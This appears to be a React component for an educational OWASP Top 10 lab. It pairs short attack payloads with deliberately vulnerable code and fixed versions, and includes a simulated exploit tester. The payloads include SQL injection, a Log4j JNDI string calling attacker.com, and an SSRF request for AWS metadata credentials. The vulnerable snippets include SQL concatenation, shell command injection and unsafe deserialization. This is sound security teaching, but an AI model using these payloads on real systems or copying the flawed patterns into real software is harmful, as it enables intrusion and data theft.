"use client";

import { useState } from "react";

// ==========================================
// TYPES & INTERFACES
// ==========================================

export type SeverityLevel = "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";

export interface OwaspItem {
  id: string;
  title: string;
  code: string;
  description: string;
  impact: string;
  payloadExample: string;
  vulnerableCode: string;
  remediatedCode: string;
  keyDefenses: string[];
}

// ==========================================
// MOCK DATA
// ==========================================

const OWASP_TOP_10: OwaspItem[] = [
  {
    id: "A01",
    code: "A01:2021",
    title: "Broken Access Control",
    description:
      "Failures allow unauthorized users to view, edit, or delete data belonging to other users (IDOR, privilege escalation).",
    impact:
      "Data exfiltration, vertical/horizontal privilege escalation, unauthorized API access.",
    payloadExample:
      "GET /api/v1/account?userId=1002 (Accessing User 1002 session as User 1001)",
    vulnerableCode: `// VULNERABLE: Trusting user-supplied ID parameter directly
app.get('/api/invoice/:id', async (req, res) => {
  const invoice = await db.query('SELECT * FROM invoices WHERE id = ' + req.params.id);
  res.json(invoice); // No authorization check!
});`,
    remediatedCode: `// SECURE: Enforce authorization against authenticated session
app.get('/api/invoice/:id', authMiddleware, async (req, res) => {
  const invoice = await db.query(
    'SELECT * FROM invoices WHERE id = $1 AND owner_id = $2',
    [req.params.id, req.user.id]
  );
  if (!invoice) return res.status(403).json({ error: 'Forbidden' });
  res.json(invoice);
});`,
    keyDefenses: [
      "Enforce RBAC/ABAC at domain model layer",
      "Deny access by default (Principle of Least Privilege)",
      "Log access control failures and alert on repeated violations",
    ],
  },
  {
    id: "A02",
    code: "A02:2021",
    title: "Cryptographic Failures",
    description:
      "Exposure of sensitive data in transit or at rest due to weak algorithms (MD5/SHA1), missing TLS, or hardcoded keys.",
    impact:
      "Credential theft, PII leakage, session hijacking over insecure networks.",
    payloadExample:
      "Intercepting plain HTTP traffic or decrypting DB passwords hashed with legacy MD5 without salt.",
    vulnerableCode: `// VULNERABLE: Plain MD5 hash without salt & hardcoded secret key
const crypto = require('crypto');
const secretKey = "SuperSecretKey123";
function hashPassword(password) {
  return crypto.createHash('md5').update(password).digest('hex');
}`,
    remediatedCode: `// SECURE: Argon2id or bcrypt with random salt & KMS managed secret
const bcrypt = require('bcrypt');
async function hashPassword(password) {
  const saltRounds = 12;
  return await bcrypt.hash(password, saltRounds);
}`,
    keyDefenses: [
      "Use TLS 1.3 everywhere with strong ciphers",
      "Hash passwords with bcrypt/Argon2id with work factor >= 12",
      "Never hardcode secrets in source code; use KMS / Vault",
    ],
  },
  {
    id: "A03",
    code: "A03:2021",
    title: "Injection (SQL, Command, XSS)",
    description:
      "Untrusted user data sent to an interpreter as part of a command or query, resulting in unauthorized command execution.",
    impact:
      "Remote Code Execution (RCE), complete database takeover, session hijacking.",
    payloadExample: `' UNION SELECT 1, username, password_hash FROM users --`,
    vulnerableCode: `// VULNERABLE: Direct string concatenation in SQL & shell commands
const user = req.query.username;
db.query("SELECT * FROM users WHERE name = '" + user + "'");
exec("ping -c 1 " + req.query.host); // Command injection!`,
    remediatedCode: `// SECURE: Parameterized queries & strict input validation
db.query("SELECT * FROM users WHERE name = $1", [user]);

// Command execution replacement with execFile & array args
const { execFile } = require('child_process');
execFile('ping', ['-c', '1', validatedHost], (err, stdout) => { ... });`,
    keyDefenses: [
      "Use ORM / Prepared Parameterized SQL queries",
      "Context-aware output encoding (HTML, JS, URL)",
      "Strict allowlist validation for all user input parameters",
    ],
  },
  {
    id: "A04",
    code: "A04:2021",
    title: "Insecure Design",
    description:
      "Flaws in architecture, threat modeling, and security design patterns that cannot be fixed by implementation alone.",
    impact:
      "Unlimited bot password guessing, missing rate limits, logical workflow bypass.",
    payloadExample:
      "Submitting 50,000 promo code requests concurrently due to missing transactional locking.",
    vulnerableCode: `// VULNERABLE: Unlimited password reset attempts without rate limiting or captcha
app.post('/api/reset-password', async (req, res) => {
  await sendResetEmail(req.body.email);
  res.send({ status: 'sent' });
});`,
    remediatedCode: `// SECURE: Rate-limiting, anti-automation token & IP throttling
const rateLimit = require('express-rate-limit');
const resetLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 3 });

app.post('/api/reset-password', resetLimiter, verifyCaptcha, async (req, res) => {
  await sendResetEmail(req.body.email);
  res.send({ status: 'sent' });
});`,
    keyDefenses: [
      "Integrate threat modeling (STRIDE) into architecture phase",
      "Implement circuit breakers, rate limits, and quota controls",
      "Segregate tenant resources and limit blast radius",
    ],
  },
  {
    id: "A05",
    code: "A05:2021",
    title: "Security Misconfiguration",
    description:
      "Default credentials left unchanged, overly verbose error stack traces, unpatched cloud S3 buckets, unnecessary open ports.",
    impact:
      "Full server compromise, internal infrastructure mapping, cloud bucket data leaks.",
    payloadExample:
      "Reading AWS metadata at http://169.254.169.254 or inspecting /debug/pprof open endpoints.",
    vulnerableCode: `// VULNERABLE: Verbose error handling returning full stack traces in Production
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack, env: process.env });
});`,
    remediatedCode: `// SECURE: Generic error message in Prod, structured logging internally
app.use((err, req, res, next) => {
  logger.error({ err, path: req.path, user: req.user?.id });
  res.status(500).json({ error: 'Internal Server Error', requestId: req.id });
});`,
    keyDefenses: [
      "Automated hardening via IaC (Terraform / Ansible)",
      "Disable unnecessary features, frameworks, and API endpoints",
      "Audit cloud IAM policies and S3 bucket public permissions",
    ],
  },
  {
    id: "A06",
    code: "A06:2021",
    title: "Vulnerable & Outdated Components",
    description:
      "Using third-party libraries, packages, or container images with known published CVE vulnerabilities.",
    impact:
      "Exploitation of zero-day or known public exploits (Log4j, Spring4Shell).",
    payloadExample: `\${jndi:ldap://attacker.com/exploit} (Log4j RCE)`,
    vulnerableCode: `// VULNERABLE: Unpinned dependencies in package.json
"dependencies": {
  "express": "*",
  "log4j-node": "1.0.0" // Vulnerable component!
}`,
    remediatedCode: `// SECURE: Lockfiles, automated vulnerability scanners in CI/CD pipeline
// .github/workflows/security.yml
// - name: Run Trivy vulnerability scanner
//   uses: aquasecurity/trivy-action@master
//   with:
//     exit-code: 1
//     severity: 'CRITICAL,HIGH'`,
    keyDefenses: [
      "Continuous CI dependency scans via Snyk / Trivy / Dependabot",
      "Software Bill of Materials (SBOM) generation & tracking",
      "Subscribe to CVE advisories and automated patch release feeds",
    ],
  },
  {
    id: "A07",
    code: "A07:2021",
    title: "Identification & Auth Failures",
    description:
      "Weak password policies, missing Multi-Factor Authentication (MFA), session fixation, or improper token validation.",
    impact: "Account takeover, credential stuffing attacks, session hijacking.",
    payloadExample:
      "Automated credential stuffing with 100k leaked username/password combos.",
    vulnerableCode: `// VULNERABLE: Storing JWT in unsecure localStorage without HTTPOnly flag
res.json({ token: jwtToken }); // Frontend puts in localStorage -> Vulnerable to XSS!`,
    remediatedCode: `// SECURE: Set JWT in HTTPOnly, Secure, SameSite=Strict Cookie
res.cookie('token', jwtToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000 // 1 hour
});`,
    keyDefenses: [
      "Enforce MFA for all user & administrator logins",
      "Use HTTPOnly, Secure cookies for web session tokens",
      "Implement breach credential lookup (HaveIBeenPwned API)",
    ],
  },
  {
    id: "A08",
    code: "A08:2021",
    title: "Software & Data Integrity Failures",
    description:
      "Code and infrastructure that does not protect against integrity violations (unverified auto-updates, insecure deserialization).",
    impact:
      "Supply chain attacks (SolarWinds style), arbitrary code execution via object deserialization.",
    payloadExample:
      "Tampered npm package update without cryptographic checksum verification.",
    vulnerableCode: `// VULNERABLE: Insecure deserialization of user input
const serialize = require('node-serialize');
app.post('/api/profile', (req, res) => {
  const userObj = serialize.unserialize(req.body.data); // Executed arbitrary functions!
});`,
    remediatedCode: `// SECURE: Standard JSON parsing with strict schema validation (Zod)
import { z } from 'zod';
const UserSchema = z.object({ username: z.string(), email: z.string().email() });

app.post('/api/profile', (req, res) => {
  const validated = UserSchema.parse(JSON.parse(req.body.data));
  res.json(validated);
});`,
    keyDefenses: [
      "Verify digital signatures and SHA256 checksums on build artifacts",
      "Use signed Git commits (GPG) and container image signing (Cosign)",
      "Avoid native object deserialization on untrusted payloads",
    ],
  },
  {
    id: "A09",
    code: "A09:2021",
    title: "Security Logging & Monitoring Failures",
    description:
      "Insufficient logging, audit trails, or real-time monitoring allows attackers to maintain persistence undetected.",
    impact:
      "Undetected data breaches lasting months, inability to perform post-incident forensics.",
    payloadExample:
      "Brute forcing admin panel over 3 weeks without a single security alert firing.",
    vulnerableCode: `// VULNERABLE: Swallowing authentication errors quietly
try {
  await authenticate(user, pass);
} catch (e) {
  // Silent fail - no log generated!
}`,
    remediatedCode: `// SECURE: Structured JSON security audit logging to SIEM (Datadog / Splunk)
try {
  await authenticate(user, pass);
} catch (e) {
  logger.warn({
    event: 'AUTH_FAILURE',
    username: user,
    ip: req.ip,
    userAgent: req.headers['user-agent'],
    timestamp: new Date().toISOString(),
  });
  throw e;
}`,
    keyDefenses: [
      "Log all authentication, authorization, and input validation failures",
      "Ensure log retention & tamper-proof centralized SIEM storage",
      "Establish automated threshold alerts for anomalous activity",
    ],
  },
  {
    id: "A10",
    code: "A10:2021",
    title: "Server-Side Request Forgery (SSRF)",
    description:
      "Server fetches a remote resource without validating the user-supplied URL, allowing requests to internal network services.",
    impact:
      "Access to internal cloud metadata (AWS IMDSv1), internal network port scanning, remote file retrieval.",
    payloadExample:
      "POST /fetch-avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    vulnerableCode: `// VULNERABLE: Direct HTTP request to user-controlled URL
app.post('/api/preview', async (req, res) => {
  const response = await fetch(req.body.url); // Fetches internal metadata / localhost!
  const data = await response.text();
  res.send(data);
});`,
    remediatedCode: `// SECURE: Restrict allowed protocols, enforce domain allowlist, & block private IP ranges
import ipaddr from 'ipaddr.js';

function validateUrl(userUrl) {
  const parsed = new URL(userUrl);
  if (!['http:', 'https:'].includes(parsed.protocol)) throw new Error('Invalid protocol');
  
  const ip = ipaddr.parse(parsed.hostname);
  if (ip.range() !== 'unicast') throw new Error('Private IP range blocked');
  return true;
} // Or enforce AWS IMDSv2 requiring token headers!`,
    keyDefenses: [
      "Enforce URL allowlists and sanitize hostname resolution",
      "Block requests to 127.0.0.1, 10.0.0.0/8, 169.254.169.254",
      "Enforce AWS IMDSv2 (requires session token header)",
    ],
  },
];

// ==========================================
// COMPONENT
// ==========================================

export default function SecOwaspSection() {
  const [selectedOwaspId, setSelectedOwaspId] = useState<string>("A01");
  const [testPayload, setTestPayload] = useState<string>(
    "GET /api/v1/account?userId=1002"
  );
  const [testMode, setTestMode] = useState<"vulnerable" | "remediated">(
    "vulnerable"
  );
  const [testOutput, setTestOutput] = useState<string | null>(null);

  const activeOwasp =
    OWASP_TOP_10.find((item) => item.id === selectedOwaspId) || OWASP_TOP_10[0];

  const handleTestExploit = () => {
    if (testMode === "vulnerable") {
      setTestOutput(
        `🚨 EXPLOIT SUCCESSFUL (200 OK)\n[VULNERABLE HANDLER EXECUTED PAYLOAD]\nPayload: "${testPayload}"\nOutput: Returned confidential record [User ID 1002, Email: admin@corp.internal, Role: SUPERADMIN].\nReason: No authorization check performed on session token.`
      );
    } else {
      setTestOutput(
        `🛡️ EXPLOIT BLOCKED (403 FORBIDDEN)\n[SECURE HANDLER SANITIZED & EVALUATED]\nPayload: "${testPayload}"\nOutput: { "error": "Access Denied", "code": "ERR_UNAUTHORIZED_RESOURCE_OWNER" }\nReason: Session token owner (User 1001) does not match requested resource owner (User 1002). Incident logged to SIEM.`
      );
    }
  };

  return (
    <section id="sec-owasp" className="scroll-mt-20 space-y-6">
      {/* Section Header Card */}
      <div className="p-5 rounded-xl bg-white border border-slate-200 card-shadow flex flex-col sm:flex-row sm:items-center gap-3">
        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full bg-rose-50 text-rose-600 border border-rose-200 text-xs font-mono font-bold shrink-0">
          S2 · OWASP Top 10 Matrix
        </span>
        <div>
          <h3 className="text-lg font-bold text-slate-900">
            OWASP Top 10 Vulnerability Matrix &amp; Remediation Lab
          </h3>
          <p className="text-xs text-slate-500 mt-0.5">
            Select any OWASP Top 10 category to view real-world exploit
            scenarios, compare vulnerable vs remediated code, and run
            interactive exploit tests.
          </p>
        </div>
      </div>

      {/* Matrix Grid */}
      <div className="grid grid-cols-2 sm:grid-cols-5 gap-3">
        {OWASP_TOP_10.map((item) => {
          const isSelected = item.id === selectedOwaspId;
          return (
            <button
              key={item.id}
              onClick={() => {
                setSelectedOwaspId(item.id);
                setTestPayload(item.payloadExample);
                setTestOutput(null);
              }}
              className={`p-3 rounded-xl border text-left transition-all ${
                isSelected
                  ? "bg-indigo-600/15 border-indigo-400 text-slate-900 shadow-md shadow-indigo-100"
                  : "bg-slate-50 border-slate-200 text-slate-500 hover:text-slate-900 hover:bg-white"
              }`}
            >
              <div className="text-[10px] font-mono text-indigo-600 font-bold">
                {item.code}
              </div>
              <div className="text-xs font-bold truncate mt-0.5">
                {item.title}
              </div>
            </button>
          );
        })}
      </div>

      {/* Selected OWASP Deep Dive */}
      <div className="p-6 rounded-xl bg-white border border-slate-200 card-shadow space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-200 pb-4">
          <div>
            <span className="px-2.5 py-0.5 rounded-full bg-indigo-50 text-indigo-600 border border-indigo-200 text-xs font-mono font-semibold">
              {activeOwasp.code}
            </span>
            <h4 className="text-xl font-extrabold text-slate-900 mt-1">
              {activeOwasp.title}
            </h4>
          </div>
          <div className="text-xs text-amber-600 font-mono bg-amber-50 px-3 py-1.5 rounded-lg border border-amber-400/20 max-w-md">
            <strong>Impact:</strong> {activeOwasp.impact}
          </div>
        </div>

        <p className="text-xs text-slate-900 leading-relaxed">
          {activeOwasp.description}
        </p>

        {/* Code Comparator */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          {/* Vulnerable Code */}
          <div className="space-y-2">
            <div className="flex items-center justify-between text-xs">
              <span className="font-bold text-rose-600 flex items-center gap-1">
                <span>❌</span> Vulnerable Implementation
              </span>
              <span className="text-[10px] text-slate-500 font-mono">
                UNSECURE
              </span>
            </div>
            {/* Fix Issue 5: dark terminal background for code block */}
            <pre className="p-4 rounded-xl bg-slate-900 text-slate-100 border border-rose-200 text-[11px] font-mono overflow-x-auto whitespace-pre-wrap">
              {activeOwasp.vulnerableCode}
            </pre>
          </div>

          {/* Remediated Code */}
          <div className="space-y-2">
            <div className="flex items-center justify-between text-xs">
              <span className="font-bold text-emerald-600 flex items-center gap-1">
                <span>✅</span> Remediated Secure Implementation
              </span>
              <span className="text-[10px] text-emerald-600 font-mono">
                HARDENED
              </span>
            </div>
            {/* Fix Issue 5: dark terminal background for code block */}
            <pre className="p-4 rounded-xl bg-slate-900 text-slate-100 border border-emerald-200 text-[11px] font-mono overflow-x-auto whitespace-pre-wrap">
              {activeOwasp.remediatedCode}
            </pre>
          </div>
        </div>

        {/* Key Defenses */}
        <div className="p-4 rounded-xl bg-white border border-slate-200 card-shadow space-y-2">
          <h5 className="text-xs font-bold text-slate-900 flex items-center gap-1.5">
            <span>🛡️</span> Key Architectural Defenses:
          </h5>
          <ul className="grid grid-cols-1 sm:grid-cols-3 gap-2 text-xs text-slate-500">
            {activeOwasp.keyDefenses.map((def) => (
              <li
                key={def}
                className="p-2 rounded bg-white border border-slate-200 text-slate-900 flex items-start gap-2"
              >
                <span className="text-indigo-600 font-bold">•</span>
                <span>{def}</span>
              </li>
            ))}
          </ul>
        </div>

        {/* Exploit Simulator */}
        <div className="p-5 rounded-xl bg-white border border-slate-200 space-y-4">
          <h5 className="text-xs font-bold text-slate-900 flex items-center gap-2">
            <span>🧪</span> Exploit / Defense Interactive Tester
          </h5>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div className="sm:col-span-2">
              <label className="block text-xs text-slate-500 mb-1">
                Test Request Payload:
              </label>
              <input
                type="text"
                value={testPayload}
                onChange={(e) => setTestPayload(e.target.value)}
                className="w-full px-3 py-2 rounded-lg bg-slate-50 border border-slate-200 text-xs text-slate-900 font-mono"
              />
            </div>

            <div>
              <label className="block text-xs text-slate-500 mb-1">
                Target Handler Mode:
              </label>
              <select
                value={testMode}
                onChange={(e) =>
                  setTestMode(e.target.value as "vulnerable" | "remediated")
                }
                className="w-full px-3 py-2 rounded-lg bg-slate-50 border border-slate-200 text-xs text-slate-900 font-mono"
              >
                <option value="vulnerable">Vulnerable Handler</option>
                <option value="remediated">Remediated Handler</option>
              </select>
            </div>
          </div>

          {/* Fix Issue 3: text-white instead of text-slate-900 */}
          <button
            onClick={handleTestExploit}
            className="px-4 py-2 rounded-lg bg-indigo-600 text-white font-semibold text-xs hover:bg-indigo-700 transition-all"
          >
            Execute Test Request
          </button>

          {testOutput && (
            <div className="p-4 rounded-lg bg-slate-50 border border-slate-200 text-xs font-mono whitespace-pre-wrap text-slate-900">
              {testOutput}
            </div>
          )}
        </div>
      </div>
    </section>
  );
}
